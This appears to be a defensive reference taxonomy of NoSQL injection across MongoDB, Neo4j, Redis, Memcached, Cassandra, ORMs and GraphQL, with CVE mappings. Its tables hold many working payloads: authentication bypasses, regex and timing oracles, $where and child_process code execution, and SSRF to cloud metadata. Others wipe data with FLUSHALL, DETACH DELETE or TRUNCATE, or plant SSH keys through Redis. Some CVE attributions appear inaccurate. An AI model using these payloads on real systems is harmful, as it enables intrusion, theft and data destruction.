# NoSQL Injection Mutation Taxonomy

> **Version:** 2026 | **Scope:** All major NoSQL database families and query models

> **Purpose:** Defensive security research and vulnerability understanding

---

## Classification Structure

This taxonomy classifies NoSQL injection mutations along three orthogonal axes. **Axis 1** (Mutation Target) defines the structural component being altered — what part of the query or interaction model carries the injection payload. **Axis 2** (Discrepancy Type) explains the class of mismatch or trust violation that makes the mutation exploitable — why the injection succeeds. **Axis 3** (Attack Scenario) maps techniques to real-world impact domains — where the mutation is weaponized.

The diversity of NoSQL injection is rooted in the polyglot nature of the ecosystem. Each database family — document stores, key-value caches, column-family databases, graph databases, and search engines — exposes a different query model, each with its own operators, syntax, and trust assumptions. Unlike SQL injection, where a single grammar is exploited, NoSQL injection requires a per-engine understanding of what "structure" means and what "injection" looks like. This is compounded by the application layer: ODMs, ORMs, GraphQL resolvers, and REST frameworks introduce additional surfaces where attacker-controlled data can bleed into query structure.

| Axis 2 — Discrepancy Type | Definition |
|--------------------------|------------|
| **Operator Smuggling**   | A scalar field accepts a query operator object, expanding query semantics beyond developer intent |
| **Type Coercion**        | Dynamic typing allows an attacker-supplied object to be treated as a primitive, or vice versa |
| **Syntax Injection**     | String concatenation into query language (Cypher, CQL, MQL string expressions) allows escape-and-control |
| **JS Execution**         | Query evaluation context allows JavaScript execution, enabling code-level operations |
| **Protocol Injection**   | Newline or delimiter characters in wire-protocol inputs allow injection of additional commands |
| **Schema Trust**         | Absent schema enforcement at the application or ODM layer allows unexpected fields/operators to reach the database |
| **Pipeline Control**     | Attacker controls aggregation stages, introducing cross-collection joins or data mutation operations |
| **Inference Channel**    | Response behavior (timing, content length, boolean branching) leaks data without direct output |

---

## §1. Comparison Operator Injection (Document Store — Operator Smuggling)

The foundational NoSQL injection class. Document databases expose comparison operators (`$ne`, `$gt`, `$lt`, `$gte`, `$lte`, `$eq`, `$in`, `$nin`) as first-class query parameters. When user input flows directly into a query filter object without type enforcement, an attacker can replace an expected scalar with an operator sub-object, silently modifying query logic.

### §1-1. Not-Equal Bypass

The `$ne` operator returns all documents where a field is _not equal_ to a value. When injected into an authentication query, this effectively returns all matching users regardless of the credential provided.

| Subtype | Mechanism | Example Payload | Condition |
|---------|-----------|-----------------|-----------|
| **Boolean Coercion** | `{"username": {"$ne": null}}` makes the username condition universally true | `username[$ne]=x&password[$ne]=x` | Application deserializes URL params into objects |
| **Admin Enumeration** | Combine regex on username with `$ne` on password | `{"username":{"$regex":"admin"},"password":{"$ne":""}}` | Application leaks whether login succeeds |
| **Multi-user Bypass** | Both fields set to `$ne` returns first record in collection | `{"username":{"$ne":"x"},"password":{"$ne":"x"}}` | `findOne()` returns an unpredictable first user |

### §1-2. Comparison Range Operators

Operators `$gt`, `$lt`, `$gte`, `$lte` compare values against strings or numbers. When the field contains passwords or tokens, range comparisons can be turned into boolean oracles for extraction.

| Subtype | Mechanism | Example Payload | Condition |
|---------|-----------|-----------------|-----------|
| **Greater-Than Empty String** | `{"username":{"$gt":""}}` matches all string-valued usernames | `{"username":{"$gt":""},"password":{"$gt":""}}` | Username/password stored as strings |
| **Numeric Range Auth Bypass** | `$gt: 0` matches all positive numeric IDs | `{"id":{"$gt":0}}` in a lookup endpoint | Application expects integer ID |
| **Range Oracle** | Binary-search password value using `$gt` and `$lt` | `{"password":{"$gt":"m","$lt":"p"}}` | Timing or response-content difference leaks true/false |

### §1-3. Inclusion/Exclusion Operators

`$in` and `$nin` accept arrays as values. An attacker can enumerate known values or exclude specific entries to bypass negative-match logic.

| Subtype | Mechanism | Example Payload | Condition |
|---------|-----------|-----------------|-----------|
| **Known-Value Enumeration** | `$in` with common usernames probes for existence | `{"username":{"$in":["admin","root","administrator"]}}` | Application reveals whether result was found |
| **Exclusion Bypass** | `$nin` excludes blocked accounts from a deny-list lookup | `{"status":{"$nin":["banned","locked"]}}` | Authorization check uses `$nin` for exclusion |

---

## §2. Logical/Boolean Operator Injection (Document Store — Operator Smuggling)

Beyond comparison operators, MongoDB and compatible engines expose `$or`, `$and`, `$nor`, and `$not`. When these are injected into filter objects they restructure query logic entirely, creating multi-branch conditions independent of developer intent.

### §2-1. $or / $and Injection

| Subtype | Mechanism | Example Payload | Condition |
|---------|-----------|-----------------|-----------|
| **Universal OR** | `$or` with always-true branch — one matching condition makes the whole query succeed | `{"$or":[{"username":"admin"},{"password":{"$exists":false}}]}` | Application passes body object directly to `find()` |
| **Credential Override** | Inject `$or` to create a second authentication path | `{"$or":[{"username":"admin","password":"pass"},{"isAdmin":true}]}` | Object body not sanitized for top-level `$or` |
| **Nested AND Bypass** | Wrap with `$and` to inject conditions alongside the intended query | `{"$and":[{"status":"active"},{"$or":[{"role":"admin"}]}]}` | Recursive sanitization not applied |

### §2-2. $not / $nor Injection

| Subtype | Mechanism | Example Payload | Condition |
|---------|-----------|-----------------|-----------|
| **$nor Auth Bypass** | `$nor` returns documents matching neither condition, bypassing both checks | `{"$nor":[{"username":"x"},{"password":"y"}]}` | Insufficient operator allowlisting |
| **$not Negation** | Wraps a condition to invert it | `{"locked":{"$not":{"$eq":true}}}` | Application adds a "not locked" check that attacker negates again |

---

## §3. Regular Expression Injection (Document Store — Inference Channel / DoS)

MongoDB's `$regex` operator accepts Perl-compatible regular expressions. This creates two distinct attack paths: **data extraction through regex-as-oracle** and **denial of service via catastrophic backtracking**.

### §3-1. Blind Data Extraction via Regex Oracle

By supplying successive anchored patterns, an attacker character-by-character extracts field values with no direct output — only a boolean signal (page loads normally vs. fails).

| Subtype | Mechanism | Example Payload | Condition |
|---------|-----------|-----------------|-----------|
| **Prefix Crawl** | `^a`, `^ab`, `^abc` anchors expose each character through response delta | `{"password":{"$regex":"^md"}}` | Distinguishable true/false from application response |
| **Length Oracle** | `.{N}` metacharacter tests exact length | `{"token":{"$regex":"^.{32}$"}}` | Useful to constrain brute-force space |
| **Case-Insensitive Scan** | `$options: "i"` flag bypasses case sensitivity in stored values | `{"username":{"$regex":"^admin","$options":"i"}}` | Case-normalized storage |

### §3-2. ReDoS via Catastrophic Regex

Injecting a regex with exponential backtracking behavior into a `$regex` filter causes CPU exhaustion on the database server. This is a server-side ReDoS — distinct from client-side ReDoS — and executes at the database engine level.

| Subtype | Mechanism | Example Payload | Condition |
|---------|-----------|-----------------|-----------|
| **Nested Quantifier ReDoS** | `(a+)+$` or `(a|aa)+` patterns cause exponential backtrack on non-matching input | `{"field":{"$regex":"^(a+)+$"}}` | `$regex` accepts user input directly |
| **Anchored Catastrophic** | Anchoring to end-of-string maximizes backtracking | `{"name":{"$regex":"^.*.*.*.*z$"}}` | Input string does not end in `z`, forcing full backtrack |

---

## §4. Server-Side JavaScript Injection (Document Store — JS Execution)

MongoDB historically exposed three JavaScript execution contexts: `$where`, `mapReduce`, and `group`. When these operators receive user-controlled input, arbitrary JavaScript runs inside the MongoDB V8/SpiderMonkey engine with access to the current document's context (`this`).

### §4-1. $where JavaScript Execution

The `$where` operator evaluates a JavaScript expression against each document. It was disabled by default as of MongoDB 7.0, but remains enabled in earlier versions and in many production systems.

| Subtype | Mechanism | Example Payload | Condition |
|---------|-----------|-----------------|-----------|
| **Tautology Injection** | `this.x == this.x` or `1==1` always returns true | `"$where": "1==1"` | `$where` enabled; operator accepted in query |
| **Timing Oracle** | `sleep()` injects measurable delay for blind extraction | `"$where": "sleep(2000)||true"` | JS-enabled MongoDB; timing observable |
| **Error Exfiltration** | `throw new Error(JSON.stringify(this))` leaks full document in error message | `"$where": "throw new Error(JSON.stringify(this))"` | Application logs/returns DB errors to client |
| **DoS Loop** | Infinite loop causes thread starvation | `"$where": "while(1){}"` | JS execution not time-limited |

### §4-2. ODM-Level JS Injection (CVE-2024-53900 / CVE-2025-23061)

When an ODM library passes user-controlled filter objects to MongoDB without stripping dangerous operators, even environments with server-side JS **disabled** may execute JavaScript — because the ODM itself evaluates the expression inside Node.js before the query reaches MongoDB.

| Subtype | Mechanism | Example Payload | Condition |
|---------|-----------|-----------------|-----------|
| **Mongoose populate() $where** | `populate({ match: req.query.author })` passes object verbatim; `$where` runs in Node.js process | `author[$where]=global.process.mainModule.require('child_process').execSync('id')` | Mongoose ≤ 8.8.2; populate with user-controlled match |
| **Top-Level Filter Bypass** | CVE-2024-53900 patch blocked top-level `$where`; CVE-2025-23061 exploited nesting under `$or` | `{"$or":[{"_id":"x"},{"$where":"..."}]}` | Mongoose 8.8.3–8.9.4; recursive strip not applied |

### §4-3. mapReduce and group Injection

`mapReduce` and `group` accept JavaScript function strings as parameters. These remain available in MongoDB 4.x/5.x and in some CouchDB deployments.

| Subtype | Mechanism | Example Payload | Condition |
|---------|-----------|-----------------|-----------|
| **mapReduce Function Injection** | `map` function receives user string; concatenation adds malicious JS | `"map": "function() { emit(this._id, '" + userInput + "'); }"` | Direct string concatenation; JS enabled |
| **finalize Function Injection** | `finalize` callback can spawn child processes in older versions | `"finalize": "function(k,v){ return require('child_process').exec('...'); }"` | MongoDB < 4.4 without `--noscripting` |

---

## §5. Aggregation Pipeline Injection (Document Store — Pipeline Control)

When an application passes user-supplied JSON directly to MongoDB's `aggregate()` function, or allows injection into individual pipeline stages, the attacker gains control over the aggregation pipeline. Unlike `find()`-level injections (which are constrained to a single collection), pipeline injection enables cross-collection data access and data mutation.

### §5-1. $lookup Cross-Collection Exfiltration

`$lookup` performs a left outer join to any collection in the same database. If an attacker controls pipeline stage content, they can join the current query result set with any other collection.

| Subtype | Mechanism | Example Payload | Condition |
|---------|-----------|-----------------|-----------|
| **Dummy-Field Join** | Specifying a non-existent `localField` returns the entire foreign collection as a nested array per document | `[{"$lookup":{"from":"users","localField":"__DUMMY__","foreignField":"__DUMMY__","as":"leak"}},{"$limit":1}]` | Application passes array body to `aggregate()` directly |
| **Pipeline Sub-Query Join** | `"pipeline"` key inside `$lookup` allows arbitrary match expression against the foreign collection | `[{"$lookup":{"from":"users","as":"leak","pipeline":[{"$match":{"_id":{"$ne":""}}}]}}]` | Aggregate endpoint exposed; pipeline key accepted |
| **$lookup with $unwind** | Combines join with array flattening to enumerate all foreign documents individually | Append `{"$unwind":"$leak"}` | Useful when response only returns first element |

### §5-2. $unionWith Cross-Collection Union

`$unionWith` (MongoDB 4.4+) merges the result set with documents from another collection — the NoSQL equivalent of SQL's `UNION ALL`.

| Subtype | Mechanism | Example Payload | Condition |
|---------|-----------|-----------------|-----------|
| **Direct Union** | Replaces original collection's output with target collection's documents | `[{"$match":{}},{"$unionWith":"users"}]` | Pipeline injection into aggregate; MongoDB ≥ 4.4 |
| **Pipeline Union with Filter** | Use `pipeline` inside `$unionWith` to filter sensitive documents | `[{"$unionWith":{"coll":"users","pipeline":[{"$match":{"role":"admin"}}]}}]` | Same as above |

### §5-3. Pipeline Mutation via $set / $merge / $out

Beyond reading, pipeline stages can write data.

| Subtype | Mechanism | Example Payload | Condition |
|---------|-----------|-----------------|-----------|
| **$set Field Injection** | Adds or overwrites fields in documents flowing through the pipeline | `[{"$set":{"role":"admin","isAdmin":true}}]` | Vulnerable aggregation endpoint; downstream code reads pipeline output |
| **$merge / $out Write-Back** | Pipeline result written to a real collection | `[{"$match":{}},{"$set":{"password":"hacked"}},{"$merge":"users"}]` | `$merge` or `$out` not blocklisted; application-level write permission |

---

## §6. Graph Database Injection — Cypher Injection (Neo4j)

Neo4j's Cypher query language is vulnerable to injection when queries are dynamically constructed via string concatenation rather than parameterized queries. Cypher injection closely mirrors SQL injection in syntax: string delimiters (`'`), comment characters (`//`), and statement chaining (`WITH`, `UNION`) are all usable.

### §6-1. String Literal Injection

| Subtype | Mechanism | Example Payload | Condition |
|---------|-----------|-----------------|-----------|
| **Tautology Bypass** | Inject `' OR 1=1 //` to close literal and add always-true condition | `' OR 1=1 WITH n RETURN n //` | Cypher query uses string concatenation |
| **Comment Termination** | Close existing condition and comment out the remainder | `Johnny '}) //` (for property map injection) | Application builds `{name: 'USER_INPUT'}` |
| **DETACH DELETE Injection** | Inject a `WITH` clause and delete all nodes | `' WITH true as x MATCH (s) DETACH DELETE s; //` | High-privilege database account |
| **Node/Relationship Enumeration** | Use `UNION MATCH (n) RETURN labels(n)` to enumerate schema | `' UNION MATCH (n) RETURN labels(n) as leak //` | String concatenation in MATCH context |

### §6-2. APOC Plugin Escalation

APOC (Awesome Procedures on Cypher), the most popular Neo4j plugin, enables HTTP requests, JavaScript execution, and dynamic query evaluation. When APOC is installed and injection is possible, attackers can leverage its procedures for SSRF, exfiltration, or code execution.

| Subtype | Mechanism | Example Payload | Condition |
|---------|-----------|-----------------|-----------|
| **apoc.load.json SSRF** | Fetch internal service URLs from the database server | `CALL apoc.load.json("http://169.254.169.254/latest/meta-data/")` | APOC Core installed; Cypher injection path |
| **apoc.cypher.doIt Re-injection** | APOC accepts string queries; concatenating user input here re-injects | `CALL apoc.cypher.doIt("CREATE (s:Student) SET s.name = '" + $input + "'",{})` | Parameter passed to APOC via string concatenation |
| **apoc.cypher.runMany for SHOW TRANSACTIONS** | APOC procedure runs in a separate transaction, enabling SHOW TRANSACTIONS exfiltration | `CALL apoc.cypher.runMany("SHOW TRANSACTIONS yield currentQuery RETURN currentQuery",{})` | APOC Core; Neo4j 5+ |
| **System Database Extraction** | Admin-level access allows querying the system database via APOC | Read password hashes from system DB nodes via `apoc.load.jsonParams` | Admin user (common in free Neo4j editions) |

### §6-3. Bolt Protocol / Driver-Level Injection

Academic research (KU Leuven, 2024) identified that some Neo4j connectors incompletely separate query specification from parameter passing, and that dynamically-constructed Cypher queries (e.g., for analytical workloads) are injection-prone even when parameterized queries are used for standard operations.

| Subtype | Mechanism | Example Payload | Condition |
|---------|-----------|-----------------|-----------|
| **Non-Parameterizable Elements** | Label names, relationship types, and ORDER BY column names cannot be parameterized in Cypher | `ORDER BY ` + userInput → `ORDER BY name UNION MATCH (n) RETURN n` | Dynamic query construction for analytical endpoints |
| **Number Literal Injection** | Numeric fields without quotes are injectable even without string delimiters | `user.id = ` + userId → `user.id = 1 OR 1=1 WITH true` | Integer parameter used without parameterization |

---

## §7. Key-Value Store Injection (Redis, Memcached — Protocol Injection)

Redis and Memcached use line-delimited text protocols (RESP for Redis; ASCII for Memcached). When user-controlled strings reach these stores without sanitization, newline injection (`\r\n`) can insert additional commands into the protocol stream. This is amplified when the attack is delivered via SSRF — turning an SSRF vulnerability into full Redis command execution.

### §7-1. Redis Command Injection

Redis uses the Redis Serialization Protocol (RESP). Each command is a newline-terminated string. Injecting `\r\n` characters into a key or value field allows appending arbitrary Redis commands.

| Subtype | Mechanism | Example Payload | Condition |
|---------|-----------|-----------------|-----------|
| **Key-Append Injection** | Append `\r\nFLUSHALL` to a key name to inject a destructive command | `mykey\r\nFLUSHALL\r\n` | Raw string passed to Redis SET command without validation |
| **SSRF → Redis Exploitation** | SSRF vulnerability opens a TCP connection to Redis; attacker sends RESP-formatted commands | HTTP redirect to `redis://127.0.0.1:6379/` followed by RESP commands | SSRF + Redis unauthenticated or pre-auth accessible |
| **Lua Script Injection (EVAL)** | `EVAL` executes arbitrary Lua on the Redis server | `EVAL "return redis.call('keys','*')" 0` | User input reaches an EVAL call |
| **ACL Bypass via Config Rewrite** | Attacker writes a new authorized_keys file via `CONFIG SET dir` and `CONFIG SET dbfilename` | Redis config rewrite to write SSH key | Redis running as root; `CONFIG` not disabled |

### §7-2. Redis Lua Scripting CVEs (2025)

Two critical 2025 CVEs in Redis's Lua scripting engine are relevant to injection chains:

| CVE | Mechanism | Impact |
|-----|-----------|--------|
| **CVE-2025-46817** | Integer overflow in Lua `unpack()` allows stack corruption via extreme index values | Memory exhaustion / crash via authenticated Lua injection |
| **CVE-2025-46818** | Metatables for basic types (strings, booleans) not set read-only on init; any authenticated user can inject methods that other users later call | Privilege escalation via shared Lua environment |

### §7-3. Memcached Protocol Injection

Memcached's ASCII protocol uses newlines and spaces as delimiters. An attacker who controls a cache key can inject additional Memcached commands.

| Subtype | Mechanism | Example Payload | Condition |
|---------|-----------|-----------------|-----------|
| **Command Append via Newline** | `\r\ndelete all_users\r\n` appended to a `get` key argument | `get mykey\r\ndelete all_users` | User input unsanitized before passing to memcache client |
| **Stats Exfiltration** | `stats` command reveals server version, memory, and connection info | `key\r\nstats\r\n` | Information leakage vector |
| **Fake Cache Poisoning** | Attacker injects a `set` command with arbitrary key/value after their input | `key\r\nset admin_token 0 3600 4\r\nhack\r\n` | Shared key namespace; no ACL on keys |

---

## §8. CQL Injection (Apache Cassandra — Syntax Injection)

Apache Cassandra's Cassandra Query Language (CQL) resembles SQL and is injectable when queries are constructed via string concatenation. CQL's restrictions (no JOINs, no UNION, no OR operator, no subqueries, no SLEEP) limit traditional exploitation paths — but **stacked query injection, UPDATE injection, and DROP/TRUNCATE injection** remain viable when the application does not use prepared statements.

### §8-1. Stacked Query Injection

Unlike MongoDB, Cassandra supports stacked queries in certain driver implementations, allowing the attacker to append a second query after a semicolon.

| Subtype | Mechanism | Example Payload | Condition |
|---------|-----------|-----------------|-----------|
| **SELECT Stacking** | Append a second SELECT to leak data from another table | `admin'; SELECT * FROM system.local; --` | Driver executes multi-statement queries; application reflects output |
| **UPDATE Privilege Escalation** | Modify a user's role or permissions by injecting an UPDATE | `admin'; UPDATE users SET role='admin' WHERE username='attacker'; --` | Write access not blocked; CQL injection in auth flow |
| **DROP / TRUNCATE Injection** | Destructive payload causes data loss | `x'; TRUNCATE TABLE sessions; --` | High-privilege app account |

### §8-2. Apache Cassandra UDF / UDA Code Injection (CVE-2021-44521)

Cassandra supports User-Defined Functions (UDFs) written in Java or JavaScript. When UDF execution is enabled in `cassandra.yaml`, an attacker who can execute a `CREATE FUNCTION` statement gains arbitrary code execution on the Cassandra node.

| Subtype | Mechanism | Condition |
|---------|-----------|-----------|
| **JavaScript UDF RCE** | `CREATE FUNCTION` with malicious JS body calls `Runtime.exec()` | `enable_user_defined_functions: true`; `allow_insecure_udfs: true` in cassandra.yaml |
| **Sandbox Escape via Java UDF** | Java UDF attempts to exit the Nashorn sandbox | Older Cassandra versions with incomplete sandboxing |

---

## §9. ODM/ORM Operator Leak (Cross-DB — Schema Trust / Type Coercion)

Modern ORM and ODM libraries for non-MongoDB databases have adopted MongoDB-style query operators (`$ne`, `$gt`, `$regex`, etc.) for their filter APIs. This imports the same operator injection vulnerability class into SQL and other backends — any ORM that exposes operator-based filtering is susceptible when user input flows directly into the `where` clause.

### §9-1. Prisma ORM Operator Injection

Prisma's `findMany()`, `findFirst()`, `updateMany()`, and `deleteMany()` functions all support query operators. Because JavaScript has no runtime type enforcement, an attacker who can pass an object instead of a string can inject operators.

| Subtype | Mechanism | Example Payload | Condition |
|---------|-----------|-----------------|-----------|
| **Auth Bypass via $not/$ne** | Replace password string with operator object | `{"email":"admin@x.com","password":{"not":"anything"}}` | Express endpoint passes `req.body` directly to `prisma.user.findFirst({where: req.body})` |
| **Time-Based Oracle via ReDoS** | Inject catastrophic regex via `contains` operator mapped to SQL LIKE | `{"name":{"contains":"^(a+)+$"}}` | MySQL backend; regex translated to LIKE |
| **Relational Field Traversal** | `select` and `include` operators leak associated records, including hashed passwords | `{"where":{"id":1},"include":{"createdBy":{"select":{"password":true}}}}` | API allows direct Prisma options passthrough |

### §9-2. Mongoose ODM Injection Beyond $where

Beyond the well-known `$where` path, Mongoose has additional injection surfaces in its schema-level hooks and query methods.

| Subtype | Mechanism | Condition |
|---------|-----------|-----------|
| **findByIdAndUpdate Operator Injection** | If update body not validated, `$set` / `$unset` operators modify arbitrary fields | Application passes `req.body` to `Model.findByIdAndUpdate()` without a projection/allowed-fields list |
| **lean() Deserialization Risk** | `lean()` returns plain JS objects; downstream code may unsafely re-use them in subsequent queries | Stored document with embedded operator keys used in a second query |
| **$expr Injection** | `$expr` evaluates aggregation expressions inside find queries; user-controlled expression may access fields outside the intended scope | Application passes filter objects to `Model.find({$expr: userInput})` |

### §9-3. Spring Data MongoDB Injection

Java's Spring Data MongoDB uses a `Query` object with `Criteria` builders. When developers use the `BasicQuery` constructor with raw string input, CQL-style string injection is possible. Additionally, the Spring `@Query` annotation with SpEL expressions introduces a secondary injection surface.

| Subtype | Mechanism | Condition |
|---------|-----------|-----------|
| **BasicQuery String Injection** | Raw JSON string passed to `BasicQuery()` constructor | `new BasicQuery("{\"username\":\"" + userInput + "\"}")` — classic string concatenation |
| **SpEL Expression Injection in @Query** | `@Query("{'username': ?#{[0]}}") ` — if SpEL processing is misconfigured, arbitrary expression evaluation | Spring Data MongoDB with SpEL-enabled `@Query`; unsanitized input |

---

## §10. GraphQL-to-NoSQL Injection (Resolver Layer — Schema Trust)

GraphQL sits in front of many NoSQL backends as a query API. When GraphQL resolvers forward filter arguments directly to database calls, they inherit the injection surface of the underlying database. The GraphQL type system does not prevent injection — type validation only checks field _names_, not the semantic safety of _values_.

### §10-1. Filter Object Pass-Through

GraphQL resolvers that spread incoming `args.filter` directly into a `collection.find()` call allow operator injection payloads to reach MongoDB or other backends.

| Subtype | Mechanism | Example Payload | Condition |
|---------|-----------|-----------------|-----------|
| **Operator Object in Variable** | GraphQL variable accepts a `filter` argument; resolver passes it to `find()` without sanitization | `query { users(filter: { "$ne": {} }) { email } }` | Resolver: `collection.find(args.filter)` |
| **Nested Operator Injection** | Deeply nested object in filter evades shallow sanitization | `query { users(filter: { role: { "$ne": "user" } }) { ... } }` | First-level key sanitization only; nested operators pass through |
| **$where via GraphQL Mutation** | Mutation arguments flow into an update query with `$where` | `mutation { updateUser(where: { "$where": "..." }) { ... } }` | Resolver passes mutation `where` argument to MongoDB update filter |

### §10-2. Introspection-Aided Reconnaissance

GraphQL introspection exposes schema metadata. An attacker can enumerate all types, fields, and mutation arguments — identifying which fields map to sensitive database fields before attempting injection.

| Subtype | Mechanism | Condition |
|---------|-----------|-----------|
| **Schema Dump** | `{__schema{types{name,fields{name}}}}` reveals all queryable fields | Introspection enabled (default in development; often left on in production) |
| **Resolver Fingerprinting** | Error messages from rejected payloads reveal underlying database type and library versions | Verbose error reporting enabled |

### §10-3. Batch Query Amplification

GraphQL natively supports batched queries in a single HTTP request. An attacker can send hundreds of operator-injected filter queries in one request, amplifying data extraction or DoS impact.

| Subtype | Mechanism | Condition |
|---------|-----------|-----------|
| **Batch Exfiltration** | Array of queries each probing a different character position of a sensitive field | No batch depth limiting; MongoDB regex oracle available |
| **Query Depth DoS** | Deeply nested GraphQL query causes recursive database calls | No depth/complexity limiting; each level triggers a DB lookup |

---

## §11. Blind & Out-of-Band Extraction Channels (Cross-DB — Inference Channel)

When an application returns no useful error messages and does not reflect query results, an attacker must use inference channels to extract data. These techniques apply across database families but are most mature for MongoDB and Neo4j.

### §11-1. Boolean-Based Blind Injection

Application behavior (response status code, content length, redirect target, presence of specific text) is treated as a 1-bit oracle. By iterating queries that evaluate to true or false, the attacker extracts data one bit at a time.

| Subtype | Mechanism | Technique |
|---------|-----------|-----------|
| **Prefix Enumeration** | `$regex: ^{known_prefix}{c}` — test each character | Automate with Python using `requests` + conditional response detection |
| **Length Probing** | `$regex: ^.{N}$` — binary search for exact field length | Reduces character search space before prefix enumeration |
| **Existence Oracle** | `$exists: true/false` confirms whether a field is present | Useful for schema discovery before extraction |

### §11-2. Time-Based Blind Injection

Where no response difference is observable, a measurable time delay serves as the oracle. Requires JavaScript execution (`$where`, ODM-level) or a ReDoS-injectable `$regex`.

| Subtype | Mechanism | Technique |
|---------|-----------|-----------|
| **sleep() Oracle** | `"$where":"this.password[0]=='a'&&sleep(2000)"` — conditional delay | Only MongoDB with `$where` / JS enabled (MongoDB < 7.0 default); also via ODM-level injection |
| **ReDoS Timing** | Catastrophic regex on a known-prefix match — measurable delay for correct prefix | `$regex: ^a(a+)+` — significantly slower when prefix `a` matches |
| **Neo4j Timing** | No native SLEEP in Cypher; use heavy computation or APOC procedure | Cypher injection with APOC `apoc.util.sleep()` |

### §11-3. Error-Based Exfiltration

Some configurations return database error messages to the client. Injecting payloads designed to _trigger errors_ that embed field contents is more efficient than boolean or timing channels.

| Subtype | Mechanism | Example |
|---------|-----------|---------|
| **$where throw Error** | `throw new Error(JSON.stringify(this))` embeds the full document in the error message | `{"$where":"throw new Error(JSON.stringify(this))"}` — if app returns raw DB errors |
| **Type Error Exfiltration** | Deliberately trigger a type mismatch that names the offending value | Varies by DB and driver; watch for stack traces with data values |

### §11-4. Second-Order Injection

Second-order injection stores a benign-looking payload in the database, which later becomes injected when a different query uses the stored value as input.

| Subtype | Mechanism | Condition |
|---------|-----------|-----------|
| **Stored Operator Key** | User registers with username `{"$ne":null}` — stored as-is; a later admin search query uses stored name as filter | Admin dashboard builds `db.users.find({name: storedName})` where `storedName` is a raw object |
| **Stored Regex Pattern** | User stores a regex string in a preference field; analytics query later applies `$regex` against the stored pattern | Periodic job runs `$regex` with stored user preference values |

---

## §12. Protocol-Level and Wire Injection (Transport / Network Layer)

These mutations target the communication channel between the application and the database, rather than the query language itself. They are often chained with SSRF, CRLF, or memory corruption vulnerabilities.

### §12-1. CRLF Injection into Database Protocols

Redis (RESP), Memcached (ASCII), and MongoDB wire protocol (BSON over TCP) all have delimiter-based framing. CRLF injection in upstream components (web frameworks, proxy middleware) that construct database connections can inject commands at the protocol level.

| Subtype | Mechanism | Condition |
|---------|-----------|-----------|
| **SSRF + Redis CRLF** | SSRF vulnerability opens TCP connection to Redis; CRLF in URL-controlled path injects RESP commands | SSRF with arbitrary TCP + Redis accessible on internal network (GitLab CVE-2018-3760 pattern) |
| **HTTP Header to Redis** | If a request header value is forwarded to a Redis command, CRLF allows injection | Header value unsanitized; forwarded to HSET or LPUSH |
| **BSON Injection** | Malformed BSON documents with incorrect field length values exploit wire-level decompression | CVE-2025-14847: zlib decompressor returns buffer size instead of decompressed length, leaking heap memory |

### §12-2. Memory Corruption via Wire Protocol (CVE-2025-14847 "MongoBleed")

MongoDB's zlib message decompression logic incorrectly returned the allocated buffer size instead of the actual decompressed data length. Sending malformed compressed packets triggered reading of uninitialized heap memory without authentication.

| Detail | Value |
|--------|-------|
| **CVE** | CVE-2025-14847 (CVSS 8.7) |
| **Trigger** | Malformed zlib-compressed MongoDB wire protocol packet |
| **Impact** | Unauthenticated heap memory leak — user data, passwords, API keys |
| **Condition** | zlib compression enabled (default configuration); exposed MongoDB port |
| **Scale** | 87,000+ vulnerable instances identified on internet; added to CISA KEV Dec 29, 2025 |
| **Patch** | MongoDB 8.2.3, 8.0.17, 7.0.28, 6.0.27, 5.0.32, 4.4.30 |

---

## Attack Scenario Mapping (Axis 3)

| Scenario | Architectural Context | Primary Mutation Categories |
|----------|-----------------------|-----------------------------|
| **Authentication Bypass** | Login endpoint; ODM `findOne()` on credential fields | §1-1, §1-2, §2-1, §4-1 |
| **Privilege Escalation** | Role/permission field queried via injectable filter | §1-3, §2-1, §9-1, §9-2 |
| **Blind Data Exfiltration** | Search endpoint; password-reset token lookup; API with boolean response | §3-1, §11-1, §11-2 |
| **Cross-Collection Exfiltration** | `aggregate()` exposed via API; GraphQL filter passthrough | §5-1, §5-2, §10-1 |
| **Remote Code Execution** | Node.js app with Mongoose; $where enabled; APOC on Neo4j; Cassandra UDF | §4-1, §4-2, §6-2, §8-2 |
| **Denial of Service** | Search/filter endpoint; $regex accessible | §3-2, §4-1 (infinite loop), §10-3 |
| **Data Tampering** | Update endpoint with injectable filter; pipeline with $merge/$out | §5-3, §9-2 |
| **Infrastructure Pivot (SSRF+Redis)** | Internal Redis accessible; SSRF in web app | §7-1, §12-1 |
| **Memory Disclosure** | Exposed MongoDB port; default zlib compression | §12-2 |
| **Schema Reconnaissance** | GraphQL introspection; error-based detection | §10-2, §11-3 |

---

## CVE / Bounty Mapping (2023–2025)

| Mutation Combination | CVE / Case | Impact / Bounty |
|---------------------|-----------|-----------------|
| §4-2 ODM-level $where injection | **CVE-2024-53900** (Mongoose ≤ 8.8.2) | CVSS 9.0; RCE via Node.js child_process via populate() $where |
| §4-2 Nested $or bypass of patch | **CVE-2025-23061** (Mongoose 8.8.3–8.9.4) | CVSS 9.0; incomplete fix — $where nested under $or bypassed strip logic |
| §12-2 zlib heap memory disclosure | **CVE-2025-14847** "MongoBleed" (MongoDB Server all versions < Dec 2025 patches) | CVSS 8.7; unauthenticated heap leak; 87,000+ internet-exposed instances; CISA KEV |
| §4-1 $where timing oracle + §3-1 regex oracle | **Rocket.Chat HackerOne #1130721** (pre-auth blind NoSQLi) | Password reset token exfiltration → account takeover; unauthenticated path |
| §2-1 + §1-1 operator injection | **Rocket.Chat HackerOne #1130874** (post-auth blind NoSQLi via users.list) | Admin account takeover → RCE; password reset + 2FA secret extraction |
| §3-1 regex blind | **Rocket.Chat HackerOne #1757676** (listEmojiCustom timing oracle) | Unauthenticated; timing-based exfiltration; timing oracle confirmed |
| §4-1 $where timing + §5-1 collection access | **Rocket.Chat HackerOne — visitor token leak** | NoSQL injection leaks visitor token and livechat messages (29 upvotes) |
| §4-1 JS execution (infinite loop) | **MongoDB $where DoS** | CPU exhaustion; service outage on JS-enabled MongoDB |
| §8-2 UDF code injection | **CVE-2021-44521** (Apache Cassandra) | CVSS 9.1; RCE on Cassandra node when UDFs enabled |
| §6-2 APOC load.json SSRF | **Neo4j APOC SSRF** (various prod reports) | Internal metadata access; cloud credential exfiltration |
| §9-1 Prisma ORM leak | **Aikido Research 2024** (Prisma + PostgreSQL) | Authentication bypass via operator injection into findFirst/findMany |
| §12-1 SSRF→Redis RCE | **GitLab CVE-2018-3760 pattern** (replicated in 2024 configurations) | Full RCE via Redis job queue manipulation |
| §5-1 + §5-2 aggregate pipeline injection | **Research: irsdl 2024** (aggregate() cross-collection) | Password/token exfiltration from users collection via $lookup/$unionWith |

---

## Detection Tools

| Tool | Target Scope | Core Technique |
|------|-------------|----------------|
